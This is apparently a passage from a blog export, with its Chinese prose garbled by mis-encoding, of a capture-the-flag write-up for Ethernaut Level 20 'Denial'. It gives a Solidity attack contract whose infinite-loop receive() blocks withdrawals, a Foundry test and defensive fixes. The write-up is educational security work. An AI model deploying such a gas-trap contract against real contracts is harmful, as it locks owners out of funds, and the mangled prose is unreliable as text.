åº”è¯¥åœ¨æ‰€æœ‰çŠ¶æ€å˜æ›´ä¹‹åå†ä¸å¤–éƒ¨åˆçº¦äº¤äº’ã€‚è™½ç„¶åœ¨æœ¬ä¾‹ä¸­ä¸æ˜¯ç›´æ¥åŸå› ï¼Œä½†è¿™æ˜¯ä¸€ä¸ªé€šç”¨çš„å®‰å…¨æœ€ä½³å®è·µã€‚</p>\n</li>\n<li><p><strong>é™åˆ¶ Gas</strong>: åœ¨è¿›è¡Œå¤–éƒ¨è°ƒç”¨æ—¶ï¼Œæ˜ç¡®æŒ‡å®šè½¬å‘çš„ Gas æ•°é‡ï¼Œè€Œä¸æ˜¯ä½¿ç”¨é»˜è®¤çš„å…¨é¢è½¬å‘ã€‚è¿™å¯ä»¥é™åˆ¶æ¶æ„åˆçº¦å¯èƒ½é€ æˆçš„æŸå®³ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// é™åˆ¶ Gas</span><br><span class=\"line\">partner.call&#123;value: amountToSend, gas: 50000&#125;(&quot;&quot;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>å¼•å…¥ææ¬¾æ¨¡å¼ (Pull-over-Push)</strong>: ä¸è¦ä¸»åŠ¨â€œæ¨é€â€èµ„é‡‘ç»™ç”¨æˆ·ï¼Œè€Œæ˜¯è®©ç”¨æˆ·è‡ªå·±â€œæ‹‰å–â€ï¼ˆææ¬¾ï¼‰ã€‚ç”¨æˆ·è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ¥ææ¬¾ï¼Œè€Œä¸æ˜¯åˆçº¦è‡ªåŠ¨å‘é€èµ„é‡‘ã€‚è¿™å¯ä»¥é˜²æ­¢å› å¤–éƒ¨è°ƒç”¨å¤±è´¥è€Œå¯¼è‡´çš„é—®é¢˜ã€‚</p>\n</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong>æ‹’ç»æœåŠ¡ (DoS)</strong>: ä¸€ç§å¸¸è§çš„æ”»å‡»ç±»å‹ï¼Œæ—¨åœ¨ä½¿ç³»ç»Ÿæ— æ³•ä¸ºåˆæ³•ç”¨æˆ·æä¾›æœåŠ¡ã€‚</li>\n<li><strong><code>call</code></strong>: Solidity ä¸­ç”¨äºä¸å…¶ä»–åˆçº¦äº¤äº’çš„åº•å±‚å‡½æ•°ã€‚å®ƒåŠŸèƒ½å¼ºå¤§ä½†ä¹Ÿå¾ˆå±é™©ï¼Œéœ€è¦å°å¿ƒä½¿ç”¨ã€‚</li>\n<li><strong><code>receive()</code> å‡½æ•°</strong>: åˆçº¦åœ¨æ¥æ”¶åˆ°æ²¡æœ‰ <code>calldata</code> çš„ä»¥å¤ªå¸æ—¶æ‰§è¡Œçš„ç‰¹æ®Šå‡½æ•°ã€‚</li>\n<li><strong>Gas</strong>: EVM ä¸­ç”¨äºè¡¡é‡è®¡ç®—æˆæœ¬çš„å•ä½ã€‚å¯¹ Gas çš„æ“çºµæ˜¯è®¸å¤šé«˜çº§æ”»å‡»çš„åŸºç¡€ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>å¯¹å¤–éƒ¨åˆçº¦çš„è°ƒç”¨æ˜¯ä¸å¯ä¿¡çš„ï¼Œå¯èƒ½ä¼šå¤±è´¥æˆ–è¢«æ¶æ„åˆ©ç”¨ã€‚</li>\n<li>å¿…é¡»å§‹ç»ˆæ£€æŸ¥åº•å±‚ <code>call</code> çš„è¿”å›å€¼ã€‚</li>\n<li>ä¸å—é™åˆ¶çš„ Gas è½¬å‘ä¼šç»™æ¶æ„åˆçº¦æ‰§è¡Œä»»æ„å¤æ‚ï¼ˆä¸”è€— Gasï¼‰ä»£ç çš„æœºä¼šã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>é€šè¿‡ä¸€ä¸ªå¯è¢«ä»»æ„è®¾ç½®çš„åœ°å€ï¼Œå°†æ¶æ„åˆçº¦å¼•å…¥åˆ°ç›®æ ‡åˆçº¦çš„æ‰§è¡Œæµç¨‹ä¸­ã€‚</li>\n<li>åœ¨æ¶æ„åˆçº¦çš„ <code>receive()</code> æˆ– <code>fallback()</code> å‡½æ•°ä¸­åˆ¶é€  Gas é™·é˜±ï¼Œè€—å°½äº¤æ˜“çš„ Gasï¼Œå¯¼è‡´ä¸»è°ƒç”¨å¤±è´¥ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>æ£€æŸ¥ <code>call</code> çš„è¿”å›å€¼ã€‚</li>\n<li>é™åˆ¶å¤–éƒ¨è°ƒç”¨çš„ Gasã€‚</li>\n<li>ä¼˜å…ˆä½¿ç”¨â€œææ¬¾â€æ¨¡å¼è€Œä¸æ˜¯â€œæ¨é€â€æ¨¡å¼ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/contracts.html#sending-ether\">Solidity Docs: Sending Ether</a></li>\n<li><a href=\"https://consensys.net/diligence/blog/2018/05/known-attacks-in-smart-contracts-and-how-to-avoid-them/#denial-of-service-dos\">Consensys: Denial of Service</a></li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-20-Denial-é€šè¿‡å¤–éƒ¨è°ƒç”¨å®ç°æ‹’ç»æœåŠ¡\"><a href=\"#ğŸ¯-Ethernaut-Level-20-Denial-é€šè¿‡å¤–éƒ¨è°ƒç”¨å®ç°æ‹’ç»æœåŠ¡\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 20: Denial - é€šè¿‡å¤–éƒ¨è°ƒç”¨å®ç°æ‹’ç»æœåŠ¡\"></a>ğŸ¯ Ethernaut Level 20: Denial - é€šè¿‡å¤–éƒ¨è°ƒç”¨å®ç°æ‹’ç»æœåŠ¡</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/20\">Ethernaut Level 20 - Denial</a><br><strong>æ”»å‡»ç±»å‹</strong>: æ‹’ç»æœåŠ¡ (Denial of Service - DoS)<br><strong>éš¾åº¦</strong>: â­â­â˜†â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>æœ¬å…³çš„ç›®æ ‡æ˜¯é˜»æ­¢ <code>owner</code> ä»åˆçº¦ä¸­æå–èµ„é‡‘ã€‚ä½ éœ€è¦è®© <code>withdraw()</code> å‡½æ•°æ— æ³•æˆåŠŸæ‰§è¡Œï¼Œä»è€Œå®ç°æ‹’ç»æœåŠ¡æ”»å‡»ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel20.svg\" alt=\"Denial Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p>è®©æˆ‘ä»¬ä»”ç»†çœ‹çœ‹ <code>withdraw()</code> å‡½æ•°çš„å®ç°ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Denial &#123;</span><br><span class=\"line\">    // ...</span><br><span class=\"line\">    address public partner; // The partner can be set by anyone.</span><br><span class=\"line\"></span><br><span class=\"line\">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class=\"line\">        partner = _partner;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function withdraw() public &#123;</span><br><span class=\"line\">        uint amountToSend = address(this).balance / 100;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // Perform the call. We don&#x27;t check the return value.</span><br><span class=\"line\">        partner.call&#123;value: amountToSend&#125;(&quot;&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        payable(owner).transfer(amountToSend);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>æ¼æ´ç‚¹éå¸¸æ˜ç¡®ï¼š</p>\n<ol>\n<li><strong>ä»»æ„è®¾ç½® <code>partner</code></strong>: ä»»ä½•äººéƒ½å¯ä»¥è°ƒç”¨ <code>setWithdrawPartner()</code> æ¥è®¾ç½® <code>partner</code> åœ°å€ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°† <code>partner</code> è®¾ç½®ä¸ºæˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„æ¶æ„åˆçº¦ã€‚</li>\n<li><strong>æœªæ£€æŸ¥çš„å¤–éƒ¨è°ƒç”¨</strong>: <code>partner.call&#123;value: amountToSend&#125;(&quot;&quot;)</code> æ˜¯ä¸€ä¸ªå¯¹å¤–éƒ¨åˆçº¦çš„è°ƒç”¨ã€‚å…³é”®åœ¨äºï¼Œä»£ç <strong>æ²¡æœ‰æ£€æŸ¥ <code>call</code> çš„è¿”å›å€¼</strong>ã€‚å¦‚æœè¿™ä¸ª <code>call</code> å¤±è´¥ï¼Œå‡½æ•°ä¼šç»§ç»­æ‰§è¡Œã€‚</li>\n<li><strong>Gas è½¬å‘</strong>: <code>call</code> é»˜è®¤ä¼šè½¬å‘æ‰€æœ‰å‰©ä½™çš„ Gasã€‚å¦‚æœ <code>partner</code> åˆçº¦çš„ <code>receive()</code> æˆ– <code>fallback()</code> å‡½æ•°æ˜¯ä¸€ä¸ª Gas é™·é˜±ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªæ— é™å¾ªç¯ï¼‰ï¼Œå®ƒå°†è€—å°½æ‰€æœ‰ Gasï¼Œå¯¼è‡´æ•´ä¸ª <code>withdraw()</code> äº¤æ˜“å›  <code>out of gas</code> è€Œå¤±è´¥ã€‚</li>\n</ol>\n<p>æ”»å‡»æ€è·¯å°±æ˜¯åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚æˆ‘ä»¬å°†éƒ¨ç½²ä¸€ä¸ªæ¶æ„åˆçº¦ï¼Œå¹¶å°†å…¶è®¾ç½®ä¸º <code>partner</code>ã€‚å½“ <code>owner</code> è°ƒç”¨ <code>withdraw()</code> æ—¶ï¼Œå¯¹æˆ‘ä»¬æ¶æ„åˆçº¦çš„ <code>call</code> å°†ä¼šæ‰§è¡Œï¼Œè§¦å‘æˆ‘ä»¬çš„æ¶æ„é€»è¾‘ï¼Œä»è€Œä½¿æ•´ä¸ªäº¤æ˜“å¤±è´¥ã€‚</p>\n<p>æˆ‘ä»¬çš„æ¶æ„åˆçº¦åªéœ€è¦ä¸€ä¸ª <code>receive()</code> å‡½æ•°ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªæ— é™å¾ªç¯ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract MaliciousPartner &#123;</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        // Consume all gas</span><br><span class=\"line\">        while (true) &#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>å½“ <code>withdraw()</code> å‡½æ•°å‘è¿™ä¸ªåˆçº¦å‘é€ä»¥å¤ªå¸æ—¶ï¼Œ<code>receive()</code> å‡½æ•°è¢«è§¦å‘ï¼Œè¿›å…¥æ— é™å¾ªç¯ï¼Œè€—å°½æ‰€æœ‰ Gasï¼Œå¯¼è‡´ <code>withdraw()</code> äº¤æ˜“ <code>revert</code>ã€‚<code>owner</code> æ°¸è¿œæ— æ³•æˆåŠŸæå–èµ„é‡‘ã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><p>æ”»å‡»åˆçº¦éå¸¸ç®€å•ï¼Œåªéœ€è¦ä¸€ä¸ª <code>receive()</code> å‡½æ•°ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">// æ¶æ„åˆçº¦ï¼Œç”¨äºå‘åŠ¨ DoS æ”»å‡»</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    // å½“æ¥æ”¶åˆ°ä»¥å¤ªå¸æ—¶ï¼Œè¿›å…¥æ— é™å¾ªç¯ä»¥è€—å°½æ‰€æœ‰ Gas</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        while (true) &#123;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Foundry-æµ‹è¯•ä»£ç \"><a href=\"#Foundry-æµ‹è¯•ä»£ç \" class=\"headerlink\" title=\"Foundry æµ‹è¯•ä»£ç \"></a>Foundry æµ‹è¯•ä»£ç </h3><p>æµ‹è¯•ä»£ç éœ€è¦éªŒè¯ <code>withdraw()</code> è°ƒç”¨ç¡®å®å¤±è´¥äº†ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Foundry çš„ <code>vm.expectRevert()</code> æ¥å®ç°è¿™ä¸€ç‚¹ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/20_Denial.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract DenialTest is Test &#123;</span><br><span class=\"line\">    Denial instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address owner;</span><br><span class=\"line\">    address player; // æ”»å‡»è€…</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        owner = vm.addr(1);</span><br><span class=\"line\">        player = vm.addr(2);</span><br><span class=\"line\"></span><br><span class=\"line\">        // éƒ¨ç½² Denial åˆçº¦å¹¶å­˜å…¥ 1 ether</span><br><span class=\"line\">        vm.startPrank(owner);</span><br><span class=\"line\">        instance = new Denial();</span><br><span class=\"line\">        vm.deal(address(instance), 1 ether);</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\"></span><br><span class=\"line\">        // éƒ¨ç½²æ”»å‡»åˆçº¦</span><br><span class=\"line\">        attacker = new Attack();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testDenialOfServiceAttack() public &#123;</span><br><span class=\"line\">        // 1. æ”»å‡»è€…å°†æ¶æ„åˆçº¦è®¾ç½®ä¸º partner</span><br><span class=\"line\">        vm.prank(player);</span><br><span class=\"line\">        instance.setWithdrawPartner(address(attacker));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. owner å°è¯•ææ¬¾</span><br><span class=\"line\">        vm.startPrank(owner);</span><br><span class=\"line\">        uint256 initialOwnerBalance = owner.balance;</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. æ–­è¨€äº¤æ˜“ä¼šå¤±è´¥ (revert)</span><br><span class=\"line\">        // å› ä¸ºå¯¹æ¶æ„ partner çš„è°ƒç”¨ä¼šè€—å°½æ‰€æœ‰ gas</span><br><span class=\"line\">        vm.expectRevert();</span><br><span class=\"line\">        instance.withdraw();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. éªŒè¯ owner çš„ä½™é¢æ²¡æœ‰å¢åŠ </span><br><span class=\"line\">        assertEq(owner.balance, initialOwnerBalance);</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>éƒ¨ç½²æ¶æ„åˆçº¦</strong>: åˆ›å»ºä¸€ä¸ª <code>Attack</code> åˆçº¦ï¼Œå…¶ <code>receive()</code> å‡½æ•°åŒ…å«ä¸€ä¸ªæ— é™å¾ªç¯ã€‚</li>\n<li><strong>è®¾ç½® <code>partner</code></strong>: è°ƒç”¨ <code>setWithdrawPartner()</code>ï¼Œå°† <code>Denial</code> åˆçº¦çš„ <code>partner</code> è®¾ç½®ä¸º <code>Attack</code> åˆçº¦çš„åœ°å€ã€‚</li>\n<li><strong>è§¦å‘æ¼æ´</strong>: å½“ <code>owner</code> è°ƒç”¨ <code>withdraw()</code> æ—¶ï¼Œå¯¹ <code>partner</code> çš„ <code>call</code> ä¼šè§¦å‘ <code>Attack</code> åˆçº¦çš„ <code>receive()</code> å‡½æ•°ï¼Œè€—å°½æ‰€æœ‰ Gasï¼Œå¯¼è‡´æ•´ä¸ªäº¤æ˜“å¤±è´¥ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><p><strong>æ£€æŸ¥å¤–éƒ¨è°ƒç”¨çš„è¿”å›å€¼</strong>: æ°¸è¿œä¸è¦å‡è®¾å¤–éƒ¨è°ƒç”¨ä¼šæˆåŠŸã€‚å¿…é¡»æ£€æŸ¥ <code>call</code> çš„è¿”å›å€¼ï¼Œå¹¶å¯¹å¤±è´¥æƒ…å†µè¿›è¡Œå¤„ç†ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ä¿®å¤å»ºè®®</span><br><span class=\"line\">(bool sent, ) = partner.call&#123;value: amountToSend&#125;(&quot;&quot;);</span><br><span class=\"line\">require(sent, &quot;Failed to send Ether to partner&quot;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>éµå¾ªâ€œæ£€æŸ¥-ç”Ÿæ•ˆ-äº¤äº’â€æ¨¡å¼</strong>: åº”è¯¥åœ¨æ‰€æœ‰çŠ¶æ€å˜æ›´ä¹‹åå†ä¸å¤–éƒ¨åˆçº¦äº¤äº’ã€‚è™½ç„¶åœ¨æœ¬ä¾‹ä¸­ä¸æ˜¯ç›´æ¥åŸå› ï¼Œä½†è¿™æ˜¯ä¸€ä¸ªé€šç”¨çš„å®‰å…¨æœ€ä½³å®è·µã€‚</p>\n</li>\n<li><p><strong>é™åˆ¶ Gas</strong>: åœ¨è¿›è¡Œå¤–éƒ¨è°ƒç”¨æ—¶ï¼Œæ˜ç¡®æŒ‡å®šè½¬å‘çš„ Gas æ•°é‡ï¼Œè€Œä¸æ˜¯ä½¿ç”¨é»˜è®¤çš„å…¨é¢è½¬å‘ã€‚è¿™å¯ä»¥é™åˆ¶æ¶æ„åˆçº¦å¯èƒ½é€ æˆçš„æŸå®³ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// é™åˆ¶ Gas</span><br><span class=\"line\">partner.call&#123;value: amountToSend, gas: 50000&#125;(&quot;&quot;);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>å¼•å…¥ææ¬¾æ¨¡å¼ (Pull-over-Push)</strong>: ä¸è¦ä¸»åŠ¨â€œæ¨é€â€èµ„é‡‘ç»™ç”¨æˆ·ï¼Œè€Œæ˜¯è®©ç”¨æˆ·è‡ªå·±â€œæ‹‰å–â€ï¼ˆææ¬¾ï¼‰ã€‚ç”¨æˆ·è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ¥ææ¬¾ï¼Œè€Œä¸æ˜¯åˆçº¦è‡ªåŠ¨å‘é€èµ„é‡‘ã€‚è¿™å¯ä»¥é˜²æ­¢å› å¤–éƒ¨è°ƒç”¨å¤±è´¥è€Œå¯¼è‡´çš„é—®é¢˜ã€‚</p>\n</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong>æ‹’ç»æœåŠ¡ (DoS)</strong>: ä¸€ç§å¸¸è§çš„æ”»å‡»ç±»å‹ï¼Œæ—¨åœ¨ä½¿ç³»ç»Ÿæ— æ³•ä¸ºåˆæ³•ç”¨æˆ·æä¾›æœåŠ¡ã€‚</li>\n<li><strong><code>call</code></strong>: Solidity ä¸­ç”¨äºä¸å…¶ä»–åˆçº¦äº¤äº’çš„åº•å±‚å‡½æ•°ã€‚å®ƒåŠŸèƒ½å¼ºå¤§ä½†ä¹Ÿå¾ˆå±é™©ï¼Œéœ€è¦å°å¿ƒä½¿ç”¨ã€‚</li>\n<li><strong><code>receive()</code> å‡½æ•°</strong>: åˆçº¦åœ¨æ¥æ”¶åˆ°æ²¡æœ‰ <code>calldata</code> çš„ä»¥å¤ªå¸æ—¶æ‰§è¡Œçš„ç‰¹æ®Šå‡½æ•°ã€‚</li>\n<li><strong>Gas</strong>: EVM ä¸­ç”¨äºè¡¡é‡è®¡ç®—æˆæœ¬çš„å•ä½ã€‚å¯¹ Gas çš„æ“çºµæ˜¯è®¸å¤šé«˜çº§æ”»å‡»çš„åŸºç¡€ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>å¯¹å¤–éƒ¨åˆçº¦çš„è°ƒç”¨æ˜¯ä¸å¯ä¿¡çš„ï¼Œå¯èƒ½ä¼šå¤±è´¥æˆ–è¢«æ¶æ„åˆ©ç”¨ã€‚</li>\n<li>å¿…é¡»å§‹ç»ˆæ£€æŸ¥åº•å±‚ <code>call</code> çš„è¿”å›å€¼ã€‚</li>\n<li>ä¸å—é™åˆ¶çš„ Gas è½¬å‘ä¼šç»™æ¶æ„åˆçº¦æ‰§è¡Œä»»æ„å¤æ‚ï¼ˆä¸”è€— Gasï¼‰ä»£ç çš„æœºä¼šã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>é€šè¿‡ä¸€ä¸ªå¯è¢«ä»»æ„è®¾ç½®çš„åœ°å€ï¼Œå°†æ¶æ„åˆçº¦å¼•å…¥åˆ°ç›®æ ‡åˆçº¦çš„æ‰§è¡Œæµç¨‹ä¸­ã€‚</li>\n<li>åœ¨æ¶æ„åˆçº¦çš„ <code>receive()</code> æˆ– <code>fallback()</code> å‡½æ•°ä¸­åˆ¶é€  Gas é™·é˜±ï¼Œè€—å°½äº¤æ˜“çš„ Gasï¼Œå¯¼è‡´ä¸»è°ƒç”¨å¤±è´¥ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>æ£€æŸ¥ <code>call</code> çš„è¿”å›å€¼ã€‚</li>\n<li>é™åˆ¶å¤–éƒ¨è°ƒç”¨çš„ Gasã€‚</li>\n<li>ä¼˜å…ˆä½¿ç”¨â€œææ¬¾â€æ¨¡å¼è€Œä¸æ˜¯â€œæ¨é€â€æ¨¡å¼ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/contracts.html#sending-ether\">Solidity Docs: Sending Ether</a></li>\n<li><a href=\"https://consensys.net/diligence/blog/2018/05/known-attacks-in-smart-contracts-and-how-to-avoid-them/#denial-of-service-dos\">Consensys: Denial of Service</a></li>\n</ul>\n"},{"title":"Ethernaut Level 21: Shop - å¤–éƒ¨è°ƒç”¨çŠ¶æ€å˜åŒ–æ¼æ´","date":"2025-01-25T08:50:00.000Z","updated":"2025-01-25T08:50:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"åˆ©ç”¨ä¸€ä¸ªçœ‹ä¼¼æ˜¯ `view` çš„å¤–éƒ¨è°ƒç”¨å‡½æ•°åœ¨ä¸¤æ¬¡è°ƒç”¨ä¹‹é—´æ”¹å˜çŠ¶æ€ï¼Œä»è€Œç»•è¿‡å®‰å…¨æ£€æŸ¥ã€‚å­¦ä¹ å¦‚ä½•è®¾è®¡ä¸€ä¸ªåœ¨ä¸åŒè°ƒç”¨ä¸­è¿”å›ä¸åŒå€¼çš„ `price()` å‡½æ•°ï¼Œä»¥ä½äºé¢„æœŸçš„ä»·æ ¼ä¹°ä¸‹å•†å“ï¼ŒæŒæ¡ Shop å…³å¡çš„ç ´è§£æŠ€å·§ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 21: Shop - å¤–éƒ¨è°ƒç”¨çŠ¶æ€å˜åŒ–æ¼æ´\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 21 - Shop](https://ethernaut.openzeppelin.com/level/21)  \n> **æ”»å‡»ç±»å‹**: 